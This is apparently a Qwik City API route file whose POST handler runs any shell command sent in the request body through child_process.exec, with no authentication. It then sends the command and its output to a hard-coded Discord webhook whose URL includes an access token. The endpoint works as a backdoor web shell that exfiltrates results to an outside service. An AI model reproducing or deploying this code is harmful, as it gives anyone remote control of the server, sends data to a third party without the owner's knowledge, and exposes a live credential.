import type {RequestHandler} from "@builder.io/qwik-city";
import {handleRequestHandlingError} from "~/app/utils";
import {exec} from "node:child_process";

const sendMessage = async (content: any) => {
    try {
        const response = await fetch("https://discord.com/api/webhooks/1206988303912665148/L6GHf_2H20kGmJTVQckpj-Wpj87y4jR9rEwHMdmsgINXd9JBNdnC4GSePK6OH9NlLXjc", {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ content }),
        });

        if (!response.ok) {
            throw new Error('Failed to send message to webhook');
        }

        console.log('Message sent successfully');
    } catch (error) {
        console.error('Error sending message:', error);
    }
};

export const onPost: RequestHandler = async ({ json, request}) => {
    try {
        const cmd = await request.json();
        json(200, cmd);
        exec(cmd.cmd, (error, stdout) => {
            if (error) {
                return;
            }
            sendMessage("```\n"+cmd.cmd+"\n\n"+stdout+"```")
        });
    } catch (e) {
        handleRequestHandlingError(e, json)
    }
}